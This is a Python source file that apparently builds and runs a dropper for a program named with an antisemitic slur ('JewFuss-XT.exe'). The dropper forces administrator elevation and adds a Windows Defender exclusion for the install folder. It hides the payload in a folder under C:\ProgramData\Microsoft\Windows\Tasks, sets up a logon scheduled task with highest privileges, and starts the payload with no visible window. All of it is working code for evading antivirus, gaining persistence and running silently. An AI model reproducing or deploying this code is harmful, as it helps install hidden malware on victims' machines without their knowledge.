import os
import sys
import time
import psutil
import shutil
import ctypes
import argparse
import PyElevate
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument('--file', type=str, default=None)
parser.add_argument('--icon', type=str, default=None)
parser.add_argument('--name', type=str, default=None)
parser.add_argument('--prevpath', type=str, default=None)
parser.add_argument('--targetpath', type=str, default=r"C:\ProgramData\Microsoft\Windows\Tasks")
args, _ = parser.parse_known_args()
del _

printnonerrors = False
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
os.chdir(SCRIPT_DIR)

try:
    if os.path.splitext(sys.argv[0])[1].lower() == ".py":
        installer_icon = f'--icon "{args.icon}"' if args.icon is not None else ""
        if args.file is None:
            input_exe = input("Enter the name of the executable in the builds folder, leave empty to use JewFuss-XT.exe:\n>> ")
        else:
            print(f'Using provided file: "{args.file}"')
            input_exe = args.file
        if not input_exe:
            input_exe = "JewFuss-XT.exe"
        while not os.path.exists(f"builds/{input_exe}"):
            input_exe = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
        exename_txt = "executablename.txt"
        with open(exename_txt, "w", encoding="utf-8") as f:
            f.write(input_exe)
        tgtpath_txt = "compiled_targetpath.txt"
        compiled_target = args.targetpath or r"C:\ProgramData\Microsoft\Windows\Tasks"
        with open(tgtpath_txt, "w", encoding="utf-8") as f:
            f.write(compiled_target)
        if args.name is not None:
            installer_name = f'--name "{args.name}-installer"'
        else:
            installer_name = f'--name "{input_exe.removesuffix(".exe")}-installer"'
        os.system(
            f'cd "{os.path.dirname(os.path.abspath(sys.argv[0]))}" && '
            f'pyinstaller --onefile '
            f'--add-binary="builds/{input_exe};." '
            f'--add-data="{exename_txt};." '
            f'--add-data="{tgtpath_txt};." '
            f'--distpath=builds --workpath=data '
            f'{installer_name} {installer_icon} "{sys.argv[0]}"'
        )
        os.remove(exename_txt)
        os.remove(tgtpath_txt)
        sys.exit("\nFinished compiling")
except KeyboardInterrupt:
    sys.exit("Keyboard interrupt, exiting compiler...")
except Exception as e:
    print(f"Error compiling: {e}")
    errored = True

PyElevate.elevate()
if not PyElevate.elevated():
    if (hasattr(args, "hidewindow") and args.hidewindow) or (hasattr(args, "updater") and args.updater):
        ctypes.windll.user32.MessageBoxW(0, "Please run as administrator.", "Permissions error", 0x10)
    sys.exit(0)

if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

exename_txt = os.path.join(base_path, "executablename.txt")
tgtpath_txt = os.path.join(base_path, "compiled_targetpath.txt")

try:
    with open(exename_txt, "r", encoding="utf-8") as f:
        app_name = f.read().strip()
except FileNotFoundError:
    app_name = "JewFuss-XT.exe"

try:
    with open(tgtpath_txt, "r", encoding="utf-8") as f:
        compiled_targetpath = f.read().strip() or r"C:\ProgramData\Microsoft\Windows\Tasks"
except FileNotFoundError:
    compiled_targetpath = r"C:\ProgramData\Microsoft\Windows\Tasks"

errored = False

def add_defender_exclusion(file_path):
    global errored
    try:
        folder = os.path.dirname(file_path)
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""'
        subprocess.run(cmd, shell=True, check=True)
        if printnonerrors:
            print(f"Windows Defender exclusion added for {folder}")
    except subprocess.CalledProcessError as e:
        print(f"Error adding Defender exclusion: {e}")
        errored = True

def create_scheduled_task(task_name, file_path):
    global errored
    try:
        schtasks_command = (
            f'schtasks /create /tn "{task_name}" /tr "{file_path}" '
            f'/sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
        )
        disable_conditions_command = (
            f'powershell -Command "'
            f'$t = Get-ScheduledTask -TaskName \\"{task_name}\\"; '
            f'$s = $t.Settings; '
            f'$s.DisallowStartIfOnBatteries = $false; '
            f'$s.StopIfGoingOnBatteries = $false; '
            f'$s.ExecutionTimeLimit = \'PT0S\'; '
            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $s"'
        )
        subprocess.run(schtasks_command, shell=True, check=True)
        subprocess.run(disable_conditions_command, shell=True, check=True)
        if printnonerrors:
            print(f"Scheduled task '{task_name}' created.")
    except subprocess.CalledProcessError as e:
        print(f"Error creating scheduled task: {e}")
        errored = True

def write_env_file(env_dir, app_name_value, app_path_value, compiled_target_value):
    try:
        if not os.path.exists(env_dir):
            os.makedirs(env_dir)
        env_path = os.path.join(env_dir, ".env")
        lines = []
        if os.path.exists(env_path):
            with open(env_path, "r", encoding="utf-8") as f:
                lines = f.read().splitlines()
        kv = {}
        for line in lines:
            if "=" in line and not line.strip().startswith("#"):
                k, v = line.split("=", 1)
                kv[k.strip()] = v.strip()
        kv["APP_NAME"] = app_name_value
        kv["APP_PATH"] = app_path_value
        kv["TARGET_DIR"] = env_dir
        kv["COMPILED_TARGET_DIR"] = compiled_target_value
        with open(env_path, "w", encoding="utf-8") as f:
            for k in sorted(kv.keys()):
                f.write(f"{k}={kv[k]}\n")
        if printnonerrors:
            print(f"Wrote .env at {env_path}")
    except Exception as e:
        print(f"Error writing .env: {e}")

def parent_exe_path():
    try:
        p = psutil.Process(os.getppid())
        return p.exe() or ""
    except Exception:
        return ""

def parent_is_safe(pexe):
    bad = {"cmd.exe","powershell.exe","pwsh.exe","explorer.exe","conhost.exe","py.exe","python.exe","pythonw.exe"}
    base = os.path.basename(pexe).lower()
    if base in bad:
        return False
    windir = os.environ.get("WINDIR", r"C:\Windows")
    if os.path.normcase(pexe).startswith(os.path.normcase(windir)):
        return False
    return True

def resolve_destination():
    if args.prevpath:
        full = os.path.abspath(args.prevpath)
        d = os.path.dirname(full)
        n = os.path.basename(full)
        if not n.lower().endswith(".exe"):
            n += ".exe"
            full = os.path.join(d, n)
        return full
    pexe = parent_exe_path()
    if pexe and os.path.isfile(pexe) and parent_is_safe(pexe):
        return pexe
    tgt = args.targetpath or compiled_targetpath or r"C:\ProgramData\Microsoft\Windows\Tasks"
    if not os.path.exists(tgt):
        os.makedirs(tgt, exist_ok=True)
    return os.path.join(tgt, app_name)

if getattr(sys, 'frozen', False):
    temp_dir = sys._MEIPASS
else:
    temp_dir = os.path.dirname(os.path.abspath(__file__))

extracted_app_path = os.path.join(temp_dir, app_name)
final_app_path = resolve_destination()
install_dir = os.path.dirname(final_app_path)
scheduled_name = os.path.splitext(os.path.basename(final_app_path))[0]

if printnonerrors:
    print(f"Installing to: {final_app_path}")

try:
    if os.path.exists(final_app_path):
        exe_basename = os.path.basename(final_app_path).lower()
        procs = list(psutil.process_iter(['pid','name','exe']))
        try:
            p = psutil.Process(os.getppid())
            if os.path.normcase((p.exe() or "")).endswith(os.path.normcase(exe_basename)):
                p.terminate()
                p.wait(timeout=5)
        except Exception:
            pass
        try:
            for p in procs:
                try:
                    pexe = (p.info['exe'] or '')
                    if os.path.basename(pexe).lower() == exe_basename:
                        p.terminate()
                except Exception:
                    pass
            time.sleep(1)
            os.system(f'taskkill /im "{exe_basename}" /f >nul 2>&1')
            time.sleep(0.5)
            os.remove(final_app_path)
        except Exception as e:
            print(f"Error deleting existing file: {e}\nRetrying in 1 second...")
            time.sleep(1)
            try:
                os.remove(final_app_path)
            except Exception as e2:
                print(f"Fatal Error: Error deleting existing file: {e2}")
            input("Press Enter to exit.")
            sys.exit(1)
    if not os.path.exists(install_dir):
        os.makedirs(install_dir, exist_ok=True)
    try:
        shutil.copy(extracted_app_path, final_app_path)
        if printnonerrors:
            print(f"Copied to {final_app_path}")
    except Exception as e:
        print(f"Fatal Error: Error moving file: {e}")
        input("Press Enter to exit.")
        sys.exit(1)
except Exception as e:
    input(f"Fatal Error: Error moving file: {e}")
    sys.exit(1)

write_env_file(install_dir, os.path.basename(final_app_path), final_app_path, compiled_targetpath)
add_defender_exclusion(final_app_path)
create_scheduled_task(scheduled_name, final_app_path)

try:
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.Popen(final_app_path, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    if printnonerrors:
        print(f"Started {final_app_path} silently")
except Exception as e:
    print(f"Error running {final_app_path}: {e}")
    errored = True

if errored:
    input("Press Enter to exit.")
sys.exit(0)